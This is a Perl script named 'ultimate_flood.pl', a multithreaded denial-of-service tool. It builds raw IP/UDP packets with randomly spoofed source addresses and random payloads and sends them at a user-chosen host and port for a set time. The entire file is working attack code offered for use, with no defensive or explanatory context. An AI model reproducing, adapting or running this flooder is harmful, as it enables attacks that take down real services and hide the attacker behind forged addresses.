use Socket;
use strict;
use threads;
use threads::shared;

if ($#ARGV != 3) {
    print "Usage: perl ultimate_flood.pl <host> <port> <time> <threads>\n";
    exit(1);
}

my ($ip, $port, $time, $num_threads) = @ARGV;
my $iaddr = inet_aton($ip) or die "Unable to resolve $ip\n";
my $endtime = time() + ($time ? $time : 1000000);
my @threads;

sub generate_payload {
    my $size = shift;
    my @chars = ('A'..'Z', 'a'..'z', '0'..'9', '!','@','#','$','%','^','&','*','(',')');
    my $pattern = "";
    $pattern .= $chars[rand @chars] for 1..$size;
    return $pattern;
}

sub random_ip {
    return join('.', map int(rand(256)), 1..4);
}

sub flood_thread {
    my ($iaddr, $port, $endtime) = @_;

    socket(flood, PF_INET, SOCK_RAW, 255);

    while (time() <= $endtime) {
        my $payload_size = int(rand(1024)) + 1;
        my $payload = generate_payload($payload_size);
        my $spoofed_ip = random_ip();

        my $ip_header = pack('C2 n3 C2 n a4 a4', 
                             0x45, 0, 20 + length($payload), int(rand(65535)), 0, 255, 17, 
                             0, inet_aton($spoofed_ip), $iaddr);

        my $udp_header = pack('n n n n', 
                              int(rand(65535)), $port, 8 + length($payload), 0);

        my $packet = $ip_header . $udp_header . $payload;

        send(flood, $packet, 0, pack_sockaddr_in($port, $iaddr));
    }

    close(flood);
}

for (my $i = 0; $i < $num_threads; $i++) {
    push(@threads, threads->create(\&flood_thread, $iaddr, $port, $endtime));
}

$_->join() for @threads;